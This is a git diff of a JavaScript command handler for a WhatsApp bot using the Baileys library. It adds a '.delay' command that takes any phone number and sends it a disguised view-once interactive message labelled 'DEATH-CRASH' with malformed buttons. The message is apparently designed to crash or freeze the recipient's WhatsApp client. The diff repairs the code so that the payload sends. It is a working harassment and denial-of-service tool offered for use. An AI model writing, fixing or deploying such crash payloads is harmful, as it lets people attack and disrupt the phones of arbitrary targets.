@@ -1,5 +1,5 @@
 import { createCanvas } from 'canvas'
-import { generateWAMessageFromContent } from '@whiskeysockets/baileys'
+import { generateWAMessageFromContent, generateWAMessageContent } from '@whiskeysockets/baileys'
 
 let handler = async (m, { conn, text, command }) => {
   if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)
@@ -7,17 +7,15 @@ let handler = async (m, { conn, text, command }) => {
   let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`
 
   try {
-    // genera immagine camuffo
+    // genera immagine camuffata
     const width = 800
     const height = 600
     const canvas = createCanvas(width, height)
     const ctx = canvas.getContext('2d')
 
-    // sfondo nero
     ctx.fillStyle = '#000'
     ctx.fillRect(0, 0, width, height)
 
-    // scritta rossa
     ctx.fillStyle = '#ff0000'
     ctx.font = 'bold 60px Arial'
     ctx.textAlign = 'center'
@@ -25,14 +23,20 @@ let handler = async (m, { conn, text, command }) => {
 
     const buffer = canvas.toBuffer()
 
-    // messaggio camuffato
+    // prepara l'immagine come messaggio
+    let prepared = await generateWAMessageContent(
+      { image: buffer },
+      { upload: conn.waUploadToServer }
+    )
+
+    // costruisci il messaggio interattivo camuffato
     let msg = await generateWAMessageFromContent(target, {
       viewOnceMessage: {
         message: {
           interactiveMessage: {
             header: {
               hasMediaAttachment: true,
-              imageMessage: (await conn.prepareMessage(target, { image: buffer }, { upload: conn.waUploadToServer })).message.imageMessage
+              imageMessage: prepared.imageMessage
             },
             body: {
               text: "𝐃𝐄𝐀𝐓𝐇-𝐂𝐑𝐀𝐒𝐇"
@@ -40,14 +44,8 @@ let handler = async (m, { conn, text, command }) => {
             nativeFlowMessage: {
               messageParamsJson: "",
               buttons: [
-                {
-                  name: "single_select",
-                  buttonParamsJson: "z"
-                },
-                {
-                  name: "call_permission_request",
-                  buttonParamsJson: "{}"
-                }
+                { name: "single_select", buttonParamsJson: "z" },
+                { name: "call_permission_request", buttonParamsJson: "{}" }
               ]
             }
           }
@@ -55,20 +53,14 @@ let handler = async (m, { conn, text, command }) => {
       }
     }, {})
 
-    await conn.relayMessage(target, msg.message, {
-      messageId: msg.key.id,
-      participant: { jid: target }
-    })
+    await conn.relayMessage(target, msg.message, { messageId: msg.key.id })
 
     m.reply(`✅ Foto camuffata inviata a ${text}`)
   } catch (e) {
     console.error(e)
-    m.reply("❌ Errore durante l'invio")
+    m.reply("❌ Errore durante l'invio: " + e.message)
   }
 }
 
 handler.command = /^delay$/i
-handler.help = ['delay <numero>']
-handler.tags = ['tools']
-
 export default handler
